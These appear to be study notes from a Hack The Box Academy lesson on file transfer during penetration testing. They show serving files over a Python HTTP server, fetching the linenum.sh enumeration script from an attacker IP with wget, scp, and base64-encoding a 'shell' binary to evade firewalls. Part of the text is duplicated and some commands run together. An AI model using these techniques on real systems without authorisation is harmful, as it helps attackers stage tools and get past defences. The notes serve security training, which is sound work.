## [Python HTTP server](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server) (link):
 
We host a python web server then cURL or wget from target machine.
 
```
HOST:  
burray@htb[/htb]$cd/tmp  
burray@htb[/htb]$python3 -m http.server 8000



Serving HTTP on 0.0.0.0 port 8000 ([http://0.0.0.0:8000/](http://0.0.0.0:8000/)) …  
REMOTE:  
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh



...SNIP...  
Saving to: 'linenum.sh'


linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]



burray@htb[/htb]$scplinenum.sh user@remotehost:/tmp/linenum.shuser@remotehost's password: *********￼linenum.sh








```
 
Serving HTTP on 0.0.0.0 port 8000 ([http://0.0.0.0:8000/](http://0.0.0.0:8000/)) …  
REMOTE:  
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh
 
...SNIP...  
Saving to: 'linenum.sh'
 
linenum.sh 100%[==============================================>] 144.86K --.-KB/s in 0.02s
 
2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
   

## SCP (if we have ssh):
 
burray@htb[/htb]$scplinenum.sh user@remotehost:/tmp/linenum.shuser@remotehost's password: *********￼linenum.sh
   

## Base64 (useful for evading firewalls):
 
If we wanted to transfer a binary file called shell, we can base64 encode it as follows:  
burray@htb[/htb]$base64 shell -w 0f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU￼  
Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file:  
  user@remotehost$echof0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell￼  
[File Transfer Reading](https://academy.hackthebox.com/module/details/24)